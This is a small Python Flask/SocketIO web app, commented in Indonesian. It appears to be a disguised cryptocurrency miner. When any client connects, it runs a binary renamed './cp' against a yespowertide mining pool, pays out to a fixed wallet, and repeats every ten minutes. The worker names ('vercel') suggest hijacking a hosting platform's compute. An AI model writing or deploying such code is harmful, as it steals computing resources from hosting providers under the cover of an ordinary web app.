from flask import Flask, send_file, render_template
from flask_socketio import SocketIO, emit
import subprocess
import threading
import logging
import sys
import sched
import time

app = Flask(__name__)
socketio = SocketIO(app)

# Konfigurasi logging ke stdout
logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(message)s')

# Objek scheduler
scheduler = sched.scheduler(time.time, time.sleep)

@app.route('/')
def index():
    return render_template('index.html')

def run_command():
    # Perintah bash yang ingin dijalankan
    command1 = 'cd build && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.vercel'
    command2 = 'cd build && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.vercel2'
    
    # Jalankan perintah pertama
    result1 = subprocess.run(command1, shell=True, capture_output=True, text=True)
    logging.info(result1.stdout)
    logging.error(result1.stderr)
    socketio.emit('log', result1.stdout)
    socketio.emit('log', result1.stderr)

    # Jalankan perintah kedua
    result2 = subprocess.run(command2, shell=True, capture_output=True, text=True)
    logging.info(result2.stdout)
    logging.error(result2.stderr)
    socketio.emit('log', result2.stdout)
    socketio.emit('log', result2.stderr)

    # Atur jadwal untuk menjalankan kembali fungsi ini dalam 10 menit
    scheduler.enter(600, 1, run_command)

@socketio.on('connect')
def handle_connect():
    # Mulai scheduler jika terhubung pertama kali
    scheduler.enter(0, 1, run_command)
    scheduler.run()

if __name__ == '__main__':
    socketio.run(app, debug=True)
